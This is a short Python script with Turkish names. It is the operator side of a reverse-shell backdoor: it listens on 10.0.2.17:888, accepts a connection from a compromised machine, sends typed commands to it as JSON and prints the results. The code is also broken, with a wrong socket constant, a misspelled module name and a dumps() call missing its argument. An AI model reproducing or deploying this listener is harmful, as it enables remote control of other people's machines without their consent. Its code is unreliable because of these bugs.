import socket
import simplejson

class Lister:
    def __init__(self,ip,port):
        baglanti = socket.socket(socket.AF_INET,socket.SOCK)
        baglanti.setsockopt(socket.SOL_SOCKET,socke.SO_REUSEADDR,1) 
        baglanti.bind((ip,port))
        baglanti.listen(0)
        print("Dinlemeye Basladi!")

        self.baglan,adres = baglanti.accept()
        print("baglanti kabul edildi. "+str(adres))

    def paketleme(self,veri):
        paket = simplejson.dumps()
        self.baglan.sendall(paket.encode("utf-8"))  #byte a çevir

    def paket_coz(self):
        gelen_veri = ""
        while True:
            try:
                gelen_veri = gelen_veri + self.baglan.recv(1024).decode("utf-8")
                return simplejson.loads(gelen_veri)
            except ValueError:
                continue
       
    def baslatma(self):
        while True:
            giris = input("Komut Gir: ")
            self.paketleme(giris)
            cikti = self.paket_coz()
            print(cikti)


baglanti_kurma=Lister("10.0.2.17",888)
baglanti_kurma.baslatma()



